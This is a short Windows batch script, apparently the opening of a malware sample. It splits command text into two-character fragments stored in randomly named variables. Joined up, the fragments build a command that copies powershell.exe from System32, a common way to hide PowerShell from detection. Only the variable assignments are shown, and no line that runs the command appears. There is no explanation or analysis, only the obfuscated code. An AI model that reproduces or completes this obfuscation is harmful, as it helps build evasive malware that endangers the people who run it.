@echo off
set "nfwmeUuQhh=ws"
set "rHVBJTBtyO=co"
set "TfHMsnHlAd= /"
set "gyKeGmXvjn=in"
set "lgHeliYMbN=ow"
set "DVOdtjhGJH=s\"
set "aiRFzFlYLg=em"
set "SOtRnjBWeC=he"
set "WuILUIuEFZ=xe"
set "qlEWutdIVF=st"
set "uObJSCHSYa=Sy"
set "BabfqwTxVu=nd"
set "hExzNqvkSe=rs"
set "KEDNRsEBPN=po"
set "AMIjzDrxUm=ll"
set "RVbyXmveJT=py"
set "NeKVUsvMZv=1."
set "CJXpxjJzqG=:\"
set "BgNaxrrRIZ=\W"
set "qJgRMcwpWY=do"
set "onOoZwfXmI=32"
set "AKNhOZUTsc=Wi"
set "zJOZrRZVou=we"
set "gHveafgdZA=.e"
set "xOvTivbMpg=we"
set "VbUKMbcxZM=rS"
set "RgobZWtuRW=he"
set "glatXlspQi=y "
set "NUXmYJjkjz=ll"
set "VzCMmmzFZY=\v"
set "yEdsUitKli=0\"
set "UVNxGoIuMt= C"
set "nupLaPCKHM=Po"
set "RhmjTVBMMc=cd"
